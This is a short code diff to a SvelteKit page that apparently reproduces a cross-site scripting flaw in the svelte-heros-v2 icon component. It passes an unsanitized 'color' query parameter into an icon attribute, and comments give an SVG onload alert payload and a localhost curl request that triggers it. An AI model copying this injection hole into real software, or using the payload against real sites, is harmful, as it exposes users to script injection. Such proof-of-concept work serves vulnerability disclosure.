@@ -3,6 +3,14 @@
 	import welcome from '$lib/images/svelte-welcome.webp';
 	import welcome_fallback from '$lib/images/svelte-welcome.png';
 	import { Eye } from 'svelte-heros-v2';
+	// get color from query
+	import { page } from '$app/stores';
+	let { searchParams } = $page.url
+	let color = 'blue'
+	if( searchParams.has('color') ) 
+		color = searchParams.get('color')
+	// Payload: `red"/> <svg onload=alert(document.domain);> <path a="`
+	// curl "http://localhost:5173/?color=red%22/%3E%20%3Csvg%20onload=alert(document.domain);%3E%20%3Cpath%20a=%22"
 </script>
 
 <svelte:head>
@@ -25,7 +33,7 @@
 	<h2>
 		try editing <strong>src/routes/+page.svelte</strong>
 	</h2>
-	<Eye color='red"/> <svg onload=alert(document.domain)> <path a="'/>	
+	<Eye color='{color}'/>	
 	<Counter />
 </section>
 
